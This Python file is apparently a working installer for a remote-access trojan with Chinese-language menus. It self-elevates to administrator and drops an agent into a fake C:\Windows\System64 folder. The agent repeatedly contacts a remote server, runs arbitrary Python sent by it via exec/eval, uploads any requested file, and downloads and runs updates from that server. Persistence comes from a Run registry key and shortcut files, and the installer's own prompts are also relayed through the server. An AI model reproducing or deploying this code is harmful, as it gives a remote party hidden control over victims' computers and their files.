import zipfile, shutil, ctypes, sys, os, psutil, subprocess, requests, time


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def tf(a):
    if a:
        return '√'
    else:
        return '×'


def jincheng():
    pids = psutil.pids()
    for pid in pids:
        try:
            p = psutil.Process(pid)
            cmd = p.cmdline()
            if 'pythonw.exe' in cmd[0] and 'me.py' in cmd[1]:
                return pid
        except:
            continue
    return '×'


def print(*arg):
    _arg = ''
    for i in arg:
        _arg += str(i)

    t = requests.get(f'{f}/print', params={'arg': _arg}).text
    if t != '':
        l.append(t)
    return


def input(*arg):
    _arg = ''
    for i in arg:
        _arg += str(i)

    t = requests.get(f'{f}/print', params={'arg': _arg}).text
    if t != '':
        l.append(t)

    while l == []:
        t = requests.get(f'{f}/print').text
        if t != '':
            l.append(t)
        time.sleep(1)

    t = l.copy()[0]
    l.pop(0)
    return t


if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()

file_ = os.path.dirname(os.path.abspath(__file__))
if os.path.isfile(file_ + r"\happy.exe"):
    subprocess.Popen([file_ + r"\happy.exe"])

l = []
# f = 'http://192.168.3.10:1903'
f = 'http://xueqian.pro:1903'

me = r'''#         -*- coding:utf-8 -*-        #
#  Copyright (c) 2019 - 2039 XueQian  #
#         version_added:: 1.2.0         #
import importlib
import subprocess


def _import(name):
    try:
        imports[name] = importlib.import_module(name)
        return 'Succeed'
    except Exception as e:
        return str(e)


def _pip(argv):
    try:
        return os.popen(r'"C:\Windows\System64\Python\python.exe" -m pip ' + argv).read()
    except Exception as e:
        return str(e)


requests = importlib.import_module('requests')
socket = importlib.import_module('socket')
time = importlib.import_module('time')

ctypes = importlib.import_module('ctypes')
psutil = importlib.import_module('psutil')
sys = importlib.import_module('sys')
os = importlib.import_module('os')
imports = {}


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", r"C:\Windows\System64\Python\pythonw.exe", r"C:\Windows\System64\me.py", None, 1)
    sys.exit()

s = 5
host = 'http://xueqian.pro:1902'
# host = 'http://192.168.3.10:1902'
if __name__ == '__main__':
    # to change the running floor
    os.chdir("C:\\Windows\\System64\\")

    try:
        _a = open('name.dll', 'r')
        name = _a.read()
        _a.close()
    except:
        name = socket.gethostname()

    # down it is plugins
    if not os.path.exists('./plugins'):
        os.mkdir('./plugins')
    else:
        for i in os.listdir('./plugins'):
            subprocess.Popen([r"C:\Windows\System64\Python\pythonw.exe", "C:\\Windows\\System64\\plugins\\" + i])

    # it's true
    while 1:
        try:
            _a = requests.post(host, json={'name': name}).json()
        except:
            time.sleep(5)
            s = 0
            continue

        # try:
        if 1:
            if _a['jieguo'] is None:
                if s == 5:
                    # time.sleep(15)
                    pass
                else:
                    s += 1
            elif _a['jieguo'] == 'update':
                requests.post(host, json={'name': name, 'headers': 'return', 'type': 'update'})
                subprocess.Popen([r"C:\Windows\System64\Python\pythonw.exe", r"C:\Windows\System64\update.py"])
                time.sleep(1)
                sys.exit()
            elif _a['jieguo'] == 'reboot':
                requests.post(host, json={'name': name, 'headers': 'return', 'type': 'reboot'})
                subprocess.Popen([r"C:\Windows\System64\Python\pythonw.exe", r"C:\Windows\System64\me.py"])
                time.sleep(1)
                sys.exit()
            elif _a['jieguo'] == 'sendfile':
                s = 0
                requests.post(host, json={'name': name, 'headers': 'return', 'type': 'sendfile', 'os': _a["shuju"],
                                          'file': str(open(_a["shuju"], 'rb').read())})
            elif _a['jieguo'] == 'commands':
                s = 0
                try:
                    exec(_a["shuju"])
                    result = str(eval(_a["fanhui"]))
                except Exception as e:
                    result = str(e)
                requests.post(host,
                              json={'name': name, 'headers': 'return', 'os': [_a["jieguo"], _a["shuju"], _a["fanhui"]],
                                    'type': '_os', 'result': result})
            else:
                s = 0
                try:
                    result = str(eval(_a["shuju"]))
                except Exception as e:
                    result = str(e)
                requests.post(host, json={'name': name, 'headers': 'return', 'os': [_a["jieguo"], _a["shuju"]],
                                          'type': 'os', 'result': result})
        # except Exception as e:
        #     print(e)
        time.sleep(5)
'''
update = r'''from urllib.request import urlretrieve
import subprocess
import time
import sys
import os

time.sleep(3)
os.remove(r'C:\Windows\System64\me.py')
time.sleep(1)
urlretrieve("http://xueqian.pro:1902/update", r'C:\Windows\System64\me.py')
subprocess.Popen([r"C:\Windows\System64\Python\pythonw.exe", r"C:\Windows\System64\me.py"])
sys.exit()
'''
me_lnk = b'L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F\xfb\x00\x08\x00 \x00\x00\x00/S@P\x9a\xbc\xd9\x01\x1aq#n\x9c\xbc\xd9\x01/S@P\x9a\xbc\xd9\x01\x98x\x01\x00\xa7\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x95\x01\x14\x00\x1fP\xe0O\xd0 \xea:i\x10\xa2\xd8\x08\x00+00\x9d\x19\x00/C:\\\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00V\x001\x00\x00\x00\x00\x00\xf6V\xdad\x10\x00Windows\x00@\x00\t\x00\x04\x00\xef\xbe\xc9V\t\x14\xf6V\xdad.\x00\x00\x00\xbdJ\x03\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\xed\x0e\x01W\x00i\x00n\x00d\x00o\x00w\x00s\x00\x00\x00\x16\x00Z\x001\x00\x00\x00\x00\x00\xf6VQg\x10\x00System64\x00\x00B\x00\t\x00\x04\x00\xef\xbe\xf6V\xdad\xf6VQg.\x00\x00\x00\xf6@\x03\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x14\xea\x00S\x00y\x00s\x00t\x00e\x00m\x006\x004\x00\x00\x00\x18\x00T\x001\x00\x00\x00\x00\x00\xf6V\x9ce\x10\x00Python\x00\x00>\x00\t\x00\x04\x00\xef\xbe\xf6V\x98e\xf6V\xa2e.\x00\x00\x00\x9d\xfd\x04\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfb\xb3>\x00P\x00y\x00t\x00h\x00o\x00n\x00\x00\x00\x16\x00b\x002\x00\x98x\x01\x00\xf6V\x9ce \x00pythonw.exe\x00H\x00\t\x00\x04\x00\xef\xbe\xf6V\x9ce\xf6V\x01h.\x00\x00\x00\xfbJ\x05\x00\x00\x00\x05\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd1\x00\x1a\x01p\x00y\x00t\x00h\x00o\x00n\x00w\x00.\x00e\x00x\x00e\x00\x00\x00\x1a\x00\x00\x00U\x00\x00\x00\x1c\x00\x00\x00\x01\x00\x00\x00\x1c\x00\x00\x00-\x00\x00\x00\x00\x00\x00\x00T\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00*\xe5\x9c\x10\x10\x00\x00\x00\x00C:\\Windows\\System64\\Python\\pythonw.exe\x00\x00\x14\x00.\x00\\\x00P\x00y\x00t\x00h\x00o\x00n\x00\\\x00p\x00y\x00t\x00h\x00o\x00n\x00w\x00.\x00e\x00x\x00e\x00\x1a\x00C\x00:\x00\\\x00W\x00i\x00n\x00d\x00o\x00w\x00s\x00\\\x00S\x00y\x00s\x00t\x00e\x00m\x006\x004\x00\\\x00P\x00y\x00t\x00h\x00o\x00n\x00\x1b\x00"\x00C\x00:\x00\\\x00W\x00i\x00n\x00d\x00o\x00w\x00s\x00\\\x00S\x00y\x00s\x00t\x00e\x00m\x006\x004\x00\\\x00m\x00e\x00.\x00p\x00y\x00"\x00!\x00%\x00S\x00y\x00s\x00t\x00e\x00m\x00R\x00o\x00o\x00t\x00%\x00\\\x00s\x00y\x00s\x00t\x00e\x00m\x003\x002\x00\\\x00S\x00H\x00E\x00L\x00L\x003\x002\x00.\x00d\x00l\x00l\x00\x10\x00\x00\x00\x05\x00\x00\xa0$\x00\x00\x00\x83\x00\x00\x00\x1c\x00\x00\x00\x0b\x00\x00\xa0\x04\xf4\x8b\xf3C\x1d\xf2B\x93\x05g\xde\x0b(\xfc#\x83\x00\x00\x00`\x00\x00\x00\x03\x00\x00\xa0X\x00\x00\x00\x00\x00\x00\x00desktop-jrcgcfj\x00\xa8\x04\x94\x7fe\x12LH\xae\xa2+\xa2\x9d\x06\xcd0t<\x7f\xbe$(\xee\x11\xb2\xa5\x00\x0c)\xfam\x98\xa8\x04\x94\x7fe\x12LH\xae\xa2+\xa2\x9d\x06\xcd0t<\x7f\xbe$(\xee\x11\xb2\xa5\x00\x0c)\xfam\x98U\x02\x00\x00\t\x00\x00\xa0\x89\x00\x00\x001SPS\xe2\x8aXF\xbcL8C\xbb\xfc\x13\x93&\x98m\xcem\x00\x00\x00\x04\x00\x00\x00\x00\x1f\x00\x00\x00.\x00\x00\x00S\x00-\x001\x00-\x005\x00-\x002\x001\x00-\x003\x009\x001\x007\x002\x008\x007\x006\x005\x00-\x001\x006\x002\x004\x002\x009\x009\x003\x007\x004\x00-\x001\x005\x006\x001\x006\x000\x002\x009\x003\x009\x00-\x001\x000\x000\x001\x00\x00\x00\x00\x00\x00\x00i\x00\x00\x001SPS\xed0\xbd\xdaC\x00\x89G\xa7\xf8\xd0\x13\xa4sf"M\x00\x00\x00d\x00\x00\x00\x00\x1f\x00\x00\x00\x1d\x00\x00\x00P\x00y\x00t\x00h\x00o\x00n\x00 \x00(\x00C\x00:\x00\\\x00W\x00i\x00n\x00d\x00o\x00w\x00s\x00\\\x00S\x00y\x00s\x00t\x00e\x00m\x006\x004\x00)\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa1\x00\x00\x001SPS0\xf1%\xb7\xefG\x1a\x10\xa5\xf1\x02`\x8c\x9e\xeb\xac)\x00\x00\x00\n\x00\x00\x00\x00\x1f\x00\x00\x00\x0c\x00\x00\x00p\x00y\x00t\x00h\x00o\x00n\x00w\x00.\x00e\x00x\x00e\x00\x00\x00\x15\x00\x00\x00\x0f\x00\x00\x00\x00@\x00\x00\x00\x00TZQ\x9a\xbc\xd9\x01\x15\x00\x00\x00\x0c\x00\x00\x00\x00\x15\x00\x00\x00\x98x\x01\x00\x00\x00\x00\x00\x1d\x00\x00\x00\x04\x00\x00\x00\x00\x1f\x00\x00\x00\x05\x00\x00\x00\x94^(u\x0bz\x8f^\x00\x00\x00\x00\x15\x00\x00\x00\x0e\x00\x00\x00\x00@\x00\x00\x00/S@P\x9a\xbc\xd9\x01\x00\x00\x00\x00}\x00\x00\x001SPS\xa6jc(=\x95\xd2\x11\xb5\xd6\x00\xc0O\xd9\x18\xd0a\x00\x00\x00\x1e\x00\x00\x00\x00\x1f\x00\x00\x00\'\x00\x00\x00C\x00:\x00\\\x00W\x00i\x00n\x00d\x00o\x00w\x00s\x00\\\x00S\x00y\x00s\x00t\x00e\x00m\x006\x004\x00\\\x00P\x00y\x00t\x00h\x00o\x00n\x00\\\x00p\x00y\x00t\x00h\x00o\x00n\x00w\x00.\x00e\x00x\x00e\x00\x00\x00\x00\x00\x00\x00\x00\x009\x00\x00\x001SPS\xb1\x16mD\xad\x8dpH\xa7H@.\xa4=x\x8c\x1d\x00\x00\x00h\x00\x00\x00\x00H\x00\x00\x00\xd8\xad\x05G\xd3]\xb2D\x83\x00,\x96\xd6\xb2\xffg\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
update_lnk = b'L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F\xfb\x00\x08\x00 \x00\x00\x00\x06[\xf0\xdb\x96\xbc\xd9\x01>\xc1\nD\x97\xbc\xd9\x017\xf5\'*@\xbc\xd9\x01\x98x\x01\x00\xa7\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x95\x01\x14\x00\x1fP\xe0O\xd0 \xea:i\x10\xa2\xd8\x08\x00+00\x9d\x19\x00/C:\\\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00V\x001\x00\x00\x00\x00\x00\xf6V\xb9b\x10\x00Windows\x00@\x00\t\x00\x04\x00\xef\xbe\xc9V\t\x14\xf6V\xb9b.\x00\x00\x00\xbdJ\x03\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}\t\xf1\x00W\x00i\x00n\x00d\x00o\x00w\x00s\x00\x00\x00\x16\x00Z\x001\x00\x00\x00\x00\x00\xf6V\x86b\x10\x00System64\x00\x00B\x00\t\x00\x04\x00\xef\xbe\xf6V\x86b\xf6V\x86b.\x00\x00\x00f-\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\xd9\xed\x00S\x00y\x00s\x00t\x00e\x00m\x006\x004\x00\x00\x00\x18\x00T\x001\x00\x00\x00\x00\x00\xf6V\xa7b\x10\x00Python\x00\x00>\x00\t\x00\x04\x00\xef\xbe\xf6V\x86b\xf6V\xa7b.\x00\x00\x00\\\x91\x00\x00\x00\x00d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0c\x1d\x01P\x00y\x00t\x00h\x00o\x00n\x00\x00\x00\x16\x00b\x002\x00\x98x\x01\x00\xf6Vr\x0f \x00pythonw.exe\x00H\x00\t\x00\x04\x00\xef\xbe\xf6V\x86b\xf6V\xe1b.\x00\x00\x00d\x91\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc9>G\x00p\x00y\x00t\x00h\x00o\x00n\x00w\x00.\x00e\x00x\x00e\x00\x00\x00\x1a\x00\x00\x00U\x00\x00\x00\x1c\x00\x00\x00\x01\x00\x00\x00\x1c\x00\x00\x00-\x00\x00\x00\x00\x00\x00\x00T\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00*\xe5\x9c\x10\x10\x00\x00\x00\x00C:\\Windows\\System64\\Python\\pythonw.exe\x00\x00\x14\x00.\x00\\\x00P\x00y\x00t\x00h\x00o\x00n\x00\\\x00p\x00y\x00t\x00h\x00o\x00n\x00w\x00.\x00e\x00x\x00e\x00\x1a\x00C\x00:\x00\\\x00W\x00i\x00n\x00d\x00o\x00w\x00s\x00\\\x00S\x00y\x00s\x00t\x00e\x00m\x006\x004\x00\\\x00P\x00y\x00t\x00h\x00o\x00n\x00\x1f\x00"\x00C\x00:\x00\\\x00W\x00i\x00n\x00d\x00o\x00w\x00s\x00\\\x00S\x00y\x00s\x00t\x00e\x00m\x006\x004\x00\\\x00u\x00p\x00d\x00a\x00t\x00e\x00.\x00p\x00y\x00"\x00!\x00%\x00S\x00y\x00s\x00t\x00e\x00m\x00R\x00o\x00o\x00t\x00%\x00\\\x00s\x00y\x00s\x00t\x00e\x00m\x003\x002\x00\\\x00S\x00H\x00E\x00L\x00L\x003\x002\x00.\x00d\x00l\x00l\x00\x10\x00\x00\x00\x05\x00\x00\xa0$\x00\x00\x00\x83\x00\x00\x00\x1c\x00\x00\x00\x0b\x00\x00\xa0\x04\xf4\x8b\xf3C\x1d\xf2B\x93\x05g\xde\x0b(\xfc#\x83\x00\x00\x00`\x00\x00\x00\x03\x00\x00\xa0X\x00\x00\x00\x00\x00\x00\x00desktop-jrcgcfj\x00\xa8\x04\x94\x7fe\x12LH\xae\xa2+\xa2\x9d\x06\xcd0J:\x7f\xbe$(\xee\x11\xb2\xa5\x00\x0c)\xfam\x98\xa8\x04\x94\x7fe\x12LH\xae\xa2+\xa2\x9d\x06\xcd0J:\x7f\xbe$(\xee\x11\xb2\xa5\x00\x0c)\xfam\x98U\x02\x00\x00\t\x00\x00\xa0\x89\x00\x00\x001SPS\xe2\x8aXF\xbcL8C\xbb\xfc\x13\x93&\x98m\xcem\x00\x00\x00\x04\x00\x00\x00\x00\x1f\x00\x00\x00.\x00\x00\x00S\x00-\x001\x00-\x005\x00-\x002\x001\x00-\x003\x009\x001\x007\x002\x008\x007\x006\x005\x00-\x001\x006\x002\x004\x002\x009\x009\x003\x007\x004\x00-\x001\x005\x006\x001\x006\x000\x002\x009\x003\x009\x00-\x001\x000\x000\x001\x00\x00\x00\x00\x00\x00\x00i\x00\x00\x001SPS\xed0\xbd\xdaC\x00\x89G\xa7\xf8\xd0\x13\xa4sf"M\x00\x00\x00d\x00\x00\x00\x00\x1f\x00\x00\x00\x1d\x00\x00\x00P\x00y\x00t\x00h\x00o\x00n\x00 \x00(\x00C\x00:\x00\\\x00W\x00i\x00n\x00d\x00o\x00w\x00s\x00\\\x00S\x00y\x00s\x00t\x00e\x00m\x006\x004\x00)\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa1\x00\x00\x001SPS0\xf1%\xb7\xefG\x1a\x10\xa5\xf1\x02`\x8c\x9e\xeb\xac)\x00\x00\x00\n\x00\x00\x00\x00\x1f\x00\x00\x00\x0c\x00\x00\x00p\x00y\x00t\x00h\x00o\x00n\x00w\x00.\x00e\x00x\x00e\x00\x00\x00\x15\x00\x00\x00\x0f\x00\x00\x00\x00@\x00\x00\x00\x00\xe6\xd1\xdc\x96\xbc\xd9\x01\x15\x00\x00\x00\x0c\x00\x00\x00\x00\x15\x00\x00\x00\x98x\x01\x00\x00\x00\x00\x00\x1d\x00\x00\x00\x04\x00\x00\x00\x00\x1f\x00\x00\x00\x05\x00\x00\x00\x94^(u\x0bz\x8f^\x00\x00\x00\x00\x15\x00\x00\x00\x0e\x00\x00\x00\x00@\x00\x00\x007\xf5\'*@\xbc\xd9\x01\x00\x00\x00\x00}\x00\x00\x001SPS\xa6jc(=\x95\xd2\x11\xb5\xd6\x00\xc0O\xd9\x18\xd0a\x00\x00\x00\x1e\x00\x00\x00\x00\x1f\x00\x00\x00\'\x00\x00\x00C\x00:\x00\\\x00W\x00i\x00n\x00d\x00o\x00w\x00s\x00\\\x00S\x00y\x00s\x00t\x00e\x00m\x006\x004\x00\\\x00P\x00y\x00t\x00h\x00o\x00n\x00\\\x00p\x00y\x00t\x00h\x00o\x00n\x00w\x00.\x00e\x00x\x00e\x00\x00\x00\x00\x00\x00\x00\x00\x009\x00\x00\x001SPS\xb1\x16mD\xad\x8dpH\xa7H@.\xa4=x\x8c\x1d\x00\x00\x00h\x00\x00\x00\x00H\x00\x00\x00\xd8\xad\x05G\xd3]\xb2D\x83\x00,\x96\xd6\xb2\xffg\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
p = 0

while 1:
    file = os.path.dirname(os.path.abspath(__file__))
    print(file)
    print('1 : 创建本体文件夹\t\t', tf(os.path.isdir(r'C:\Windows\System64')))
    print('2 : 创建本体文件\t\t', tf(os.path.isfile(r'C:\Windows\System64\me.py')))
    print('3 : 创建 update 文件\t\t', tf(os.path.isfile(r'C:\Windows\System64\update.py')))
    print('4 : 解压 Python 文件夹\t\t', tf(os.path.isdir(r'C:\Windows\System64\python')))
    print('5 : 创建本体快捷方式\t\t', tf(os.path.isfile(r'C:\Windows\System64\me.lnk')))
    print('6 : 创建 update 快捷方式\t', tf(os.path.isfile(r'C:\Windows\System64\update.lnk')))

    reg = os.popen(r'reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run').read()
    print('7 : 创建启动项\t\t\t', tf('XueQian' in reg and 'C:\\WINDOWS\\System64\\me.py' in reg))
    print('8 : 启动 me\t\t\t', jincheng())
    print('注: √ （8 为 pid 值）表示有，× 表示无。')
    print('\t')
    print('a : 删除本体文件夹')
    print('b : 删除本体文件')
    print('c : 删除 update 文件')
    print('d : 删除 Python 文件夹')
    print('e : 删除本体快捷方式')
    print('f : 删除 update 快捷方式')
    print('g : 删除启动项')
    print('h : 杀死 me')
    print('\t')
    print('- : 重新输出')
    print('\t')
    print('! : 退出安装程序')

    aa = input('>>>')
    for a in aa:
        try:
            if a == '1':
                os.mkdir(r'C:\Windows\System64')
            elif a == '2':
                x = open(r'C:\Windows\System64\me.py', 'w')
                x.write(me)
                x.close()
            elif a == '3':
                x1 = open(r'C:\Windows\System64\update.py', 'w')
                x1.write(update)
                x1.close()
            elif a == '4':
                y = zipfile.ZipFile(file + r'\kuozhan.dll')  # input('目录 >>>')
                y.extractall('C:\\Windows\\System64\\')
                y.close()
            elif a == '5':
                z = open(r'C:\Windows\System64\me.lnk', 'wb')
                z.write(me_lnk)
                z.close()
            elif a == '6':
                z1 = open(r'C:\Windows\System64\update.lnk', 'wb')
                z1.write(update_lnk)
                z1.close()
            elif a == '7':
                os.popen(r'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v XueQian /t REG_SZ /d "C:\WINDOWS\System64\Python\pythonw.exe \"C:\WINDOWS\System64\me.py\"" /f')
            elif a == '8':
                subprocess.Popen([r"C:\Windows\System64\Python\pythonw.exe", r"C:\Windows\System64\me.py"])


            elif a == 'a':
                os.system('taskkill /t /f /im pythonw.exe')
                shutil.rmtree(r'C:\Windows\System64')
            elif a == 'b':
                os.system('taskkill /t /f /im pythonw.exe')
                os.remove(r'C:\Windows\System64\me.py')
            elif a == 'c':
                os.system('taskkill /t /f /im pythonw.exe')
                os.remove(r'C:\Windows\System64\update.py')
            elif a == 'd':
                os.system('taskkill /t /f /im pythonw.exe')
                shutil.rmtree(r'C:\Windows\System64\Python')
            elif a == 'e':
                os.remove(r'C:\Windows\System64\me.lnk')
            elif a == 'f':
                os.remove(r'C:\Windows\System64\update.lnk')
            elif a == 'g':
                os.popen(r'reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v XueQian /f')
            elif a == 'h':
                os.system('taskkill /t /f /im pythonw.exe')

            elif a == '-':
                pass

            elif a == '!' or a == '！':
                sys.exit()
        except Exception as e:
            print(e)
    print('---OK---')
